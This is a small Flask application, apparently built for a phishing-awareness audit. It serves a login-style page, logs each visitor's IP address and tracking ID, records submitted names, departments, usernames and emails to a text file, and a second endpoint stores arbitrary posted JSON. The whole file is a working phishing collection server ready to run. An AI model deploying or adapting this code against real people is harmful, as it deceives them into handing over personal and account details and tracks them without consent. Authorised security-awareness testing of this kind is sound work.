PYTHON APfrom flask import Flask, request, render_template, redirect
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    ip = request.remote_addr
    id_usuario = request.args.get('id')

    if request.method == 'POST':
        nome = request.form.get('nome')
        setor = request.form.get('setor')
        usuario = request.form.get('usuario')
        email = request.form.get('email')

        with open('logins.txt', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.datetime.now()} | IP: {ip} | ID: {id_usuario} | Nome: {nome} | Setor: {setor} | Usuario: {usuario} | Email: {email}\n")
            print(f"Recebido: nome={nome}, setor={setor}, usuario={usuario}, email={email}")
 
 #aqui eu coloquei para que depois que a pessoa acesse e coloque as informações, ele vá para uma pagina de espera. Mas é opcional, pode retirar
        #return redirect("http://192.0.0.0:0/phishing-audit")

    # Loga o IP mesmo que o usuário não envie o formulário
    with open('logins.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | IP: {ip} | ID: {id_usuario} ACESSOU O LINK\n")
        print(f"IP acessou: {ip}")

    return render_template('index.html')


@app.route('/coletar', methods=['POST'])
def coletar():
    data = request.get_json()
    ip = request.remote_addr
    with open('info.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | IP: {ip} | Dados: {data}\n")
    return '', 204


if __name__ == '__main__':
    #coloca o ip pra rodar o python
    app.run(host='0.0.0.0', port=5000)
